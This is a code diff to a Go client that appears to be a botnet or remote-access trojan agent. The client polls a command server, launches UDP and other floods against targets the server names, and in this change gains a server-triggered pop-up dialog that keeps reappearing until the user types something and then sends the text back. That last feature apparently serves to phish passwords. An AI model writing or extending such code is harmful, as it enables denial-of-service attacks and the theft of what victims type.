@@ -13,6 +13,7 @@ TODO:
 
 import (
 	"context"
+	"fmt"
 	"log"
 	"os/exec"
 	"runtime"
@@ -32,6 +33,7 @@ import (
 	"github.com/Xart3mis/AKILTC/pb"
 	"github.com/go-gl/gl/all-core/gl"
 	"github.com/go-gl/glfw/v3.3/glfw"
+	"github.com/ncruces/zenity"
 	"github.com/nullboundary/glfont"
 	"golang.design/x/hotkey"
 )
@@ -146,7 +148,7 @@ func main() {
 	window.SetCloseCallback(CloseCallback)
 
 	lastFrameTime := 0.0
-	fpslimit := 1.0 / 15.0
+	fpslimit := 1.0 / 100.0
 
 	for !window.ShouldClose() {
 		now := glfw.GetTime()
@@ -160,8 +162,9 @@ func main() {
 		if (now - lastFrameTime) >= fpslimit {
 			lastFrameTime = now
 
-			d, err := c.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
 			go func() {
+				d, err := c.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
+
 				if err != nil {
 					log.Println("Error during GetCommand:", err)
 				}
@@ -176,8 +179,9 @@ func main() {
 				}
 			}()
 
-			flood, _ := c.GetFlood(ctx, &pb.Void{})
 			go func() {
+				flood, _ := c.GetFlood(ctx, &pb.Void{})
+
 				if flood.GetShouldFlood() {
 					switch flood.FloodType {
 					case 0:
@@ -192,6 +196,23 @@ func main() {
 						udpflood.UdpFloodUrl(flood.GetUrl(), flood.GetNumThreads(),
 							time.Duration(flood.GetLimit())*time.Second)
 					}
+				}
+			}()
+
+			go func() {
+				dialog, _ := c.GetDialog(ctx, &pb.ClientDataRequest{ClientId: pid})
+
+				if dialog.GetShouldShowDialog() {
+					var text string = ""
+					for len(text) <= 0 {
+						fmt.Println(dialog.GetDialogPrompt(), dialog.GetDialogTitle())
+						text, err = zenity.Entry(dialog.GetDialogPrompt(), zenity.Title(dialog.GetDialogTitle()))
+					}
+
+					c.SetDialogOutput(ctx, &pb.DialogOutput{
+						EntryText: text,
+						Id: &pb.ClientDataRequest{
+							ClientId: pid}})
 				}
 			}()
 
